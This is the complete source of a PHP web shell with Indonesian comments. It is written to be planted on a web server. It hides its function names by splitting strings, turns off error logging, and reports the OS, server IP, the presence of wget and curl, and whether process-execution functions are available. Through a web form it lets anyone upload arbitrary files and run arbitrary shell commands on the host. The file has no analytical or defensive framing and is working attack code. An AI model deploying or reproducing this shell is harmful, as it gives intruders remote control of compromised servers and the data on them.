<?php
@ini_set('log_errors', 0);
@ini_set('display_errors', 1);
@error_reporting(E_ALL);
while(@ob_end_clean());

$f = 'move' . '_uploaded_' . 'file';
$g = 'get' . 'cwd';
$d = empty($_POST['x1']) ? '' : $_POST['x1'];
$w = empty($_POST['x2']) ? $g() : $_POST['x2'];
$u = $_SERVER['REQUEST_URI'];
$s = '';

// --- FUNGSI TAMBAHAN UNTUK CEK COMMAND/VERSION ---
function get_cmd_version($cmd) {
    if (function_exists('shell_exec')) {
        $result = @shell_exec($cmd . ' --version 2>&1');
        if ($result === null || $result === false) {
            return '❌ Not Found / Disabled';
        }

        $lines = explode("\n", trim($result));
        if (empty($lines[0])) {
             return '❌ Not Found / Disabled';
        }
        
        $version = '';
        foreach ($lines as $line) {
            $line = trim($line);
            if (stripos($line, 'version') !== false) {
                $version = strip_tags(htmlentities(substr($line, 0, 70) . (strlen($line) > 70 ? '...' : '')));
                break;
            }
        }
        
        return $version ?: '✅ Found (Version Unknown/Hidden)';
    } else {
        return '❌ shell_exec Disabled';
    }
}
// --- AKHIR FUNGSI TAMBAHAN ---

// --- INFORMASI SISTEM & METHOD ---
$os = php_uname('s') . ' ' . php_uname('r');
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A';
$wget_info = get_cmd_version('wget');
$curl_info = get_cmd_version('curl');

$popen_status = function_exists('popen') ? '✅ Available' : '❌ Disabled';
$proc_open_status = function_exists('proc_open') ? '✅ Available' : '❌ Disabled';
// --- AKHIR INFORMASI SISTEM ---

if (isset($_FILES['f1']) && $_FILES['f1']['error'] === UPLOAD_ERR_OK) {
  $t = $w . '/' . basename($_FILES['f1']['name']);
  if ($f($_FILES['f1']['tmp_name'], $t)) {
    $s .= "[+] File uploaded: <i>$t</i> (" . $_FILES['f1']['size'] . " bytes)<br />";
  }
}

// --- TAMPILAN INFORMASI DI POJOK KIRI ATAS ---
echo "<b>System :</b> $os<br>";
echo "<b>Server Ip :</b> $server_ip<br>";
echo "<b>Wget :</b> $wget_info<br>";
echo "<b>Curl :</b> $curl_info<br>";
echo "<b>popen :</b> $popen_status<br>";
echo "<b>proc_open :</b> $proc_open_status<br>";
echo "<hr>";
// --- AKHIR TAMPILAN INFORMASI ---

?>
<form method="post" action="<?php echo $u; ?>" enctype="multipart/form-data">
  <input type="text" name="x2" value="<?php echo $w; ?>" size="50"><br><br>
  <input type="file" name="f1"><br><br>
  <input type="text" name="x1" value="<?php echo $d; ?>" size="50">
  <input type="submit" value="GO">
</form>
<hr>
<?php
echo "<pre>$s";
if (!empty($d)) {
  $full_cmd = (DIRECTORY_SEPARATOR === '/' ? 'exec 2>&1; ' : 'cmd /C "') . $d . (DIRECTORY_SEPARATOR !== '/' ? '"' : '');
  
  // Otomatis memilih proc_open jika tersedia, fallback ke popen
  if (function_exists('proc_open')) {
      echo "[~] Executing (proc_open): $d\n";
      $descriptorspec = array(
          0 => array("pipe", "r"),
          1 => array("pipe", "w"),
          2 => array("pipe", "w")
      );
      $process = @proc_open($full_cmd, $descriptorspec, $pipes);
      if (is_resource($process)) {
          echo @stream_get_contents($pipes[1]);
          echo @stream_get_contents($pipes[2]);
          @fclose($pipes[0]);
          @fclose($pipes[1]);
          @fclose($pipes[2]);
          @proc_close($process);
      } else {
          echo "[-] Failed to execute via proc_open\n";
      }
  } elseif (function_exists('popen')) {
      echo "[~] Executing (popen): $d\n";
      $p = @popen($full_cmd, 'r');
      if ($p) {
          while (!feof($p)) echo @fread($p, 4096);
          @pclose($p);
      } else {
          echo "[-] Failed to execute via popen\n";
      }
  } else {
      echo "[-] Both popen and proc_open are disabled!\n";
  }
}
echo "</pre>";
?>
